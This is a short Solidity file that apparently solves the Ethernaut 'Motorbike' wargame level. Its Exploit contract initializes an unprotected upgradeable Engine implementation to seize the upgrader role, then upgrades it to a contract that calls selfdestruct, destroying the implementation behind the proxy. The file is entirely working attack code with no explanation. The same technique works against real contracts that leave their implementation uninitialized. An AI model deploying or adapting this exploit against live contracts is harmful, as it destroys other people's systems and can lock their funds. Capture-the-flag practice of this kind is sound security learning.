// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function upgrader() external returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

interface IMotorbike {

}

contract SuicideContract {
    function commitSuicide() public {
        selfdestruct(payable(address(0)));
    }
}

contract Exploit {
    IMotorbike public motorbikeIface;
    IEngine public engineIface;

    constructor(address motorbikeAddress, address engineAddress) public {
        motorbikeIface = IMotorbike(address(motorbikeAddress));
        engineIface = IEngine(address(engineAddress));
    }

    function fire() public {
        SuicideContract s = new SuicideContract();
        engineIface.initialize();
        engineIface.upgradeToAndCall(address(s), abi.encodeWithSignature("commitSuicide()"));
    }   
}